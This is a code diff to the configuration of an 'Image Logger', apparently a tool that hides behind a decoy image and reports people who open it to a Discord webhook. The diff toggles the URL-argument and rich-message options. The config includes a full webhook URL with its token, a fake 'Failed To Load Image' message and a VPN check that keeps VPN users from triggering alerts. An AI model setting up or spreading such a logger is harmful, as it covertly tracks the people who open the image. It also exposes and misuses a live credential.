@@ -15,7 +15,7 @@ config = {
     "webhook": "https://discordapp.com/api/webhooks/1442342461694541936/UMFj8lToq5onM8To52yyD0m1qmVWcKP_2X82gW-NXVaokyMpNsvHTYmbHNWLf7_VeUJn",
     "image": "https://images.techhive.com/images/article/2014/04/windows-xp-bliss-wallpaper-image-100259888-orig.jpg", # You can also have a custom image by using a URL argument
                                                # (E.g. yoursite.com/imagelogger?url=<Insert a URL-escaped link to an image here>)
-    "imageArgument": True, # Allows you to use a URL argument to change the image (SEE THE README)
+    "imageArgument": False, # Allows you to use a URL argument to change the image (SEE THE README)
 
     # CUSTOMIZATION #
     "username": "Image Logger", # Set this to the name you want the webhook to have
@@ -29,7 +29,7 @@ config = {
     "message": { # Show a custom message when the user opens the image
         "doMessage": False, # Enable the custom message?
         "message": "Failed To Load Image", # Message to show
-        "richMessage": False, # Enable rich text? (See README for more info)
+        "richMessage": True, # Enable rich text? (See README for more info)
     },
 
     "vpnCheck": 1, # Prevents VPNs from triggering the alert
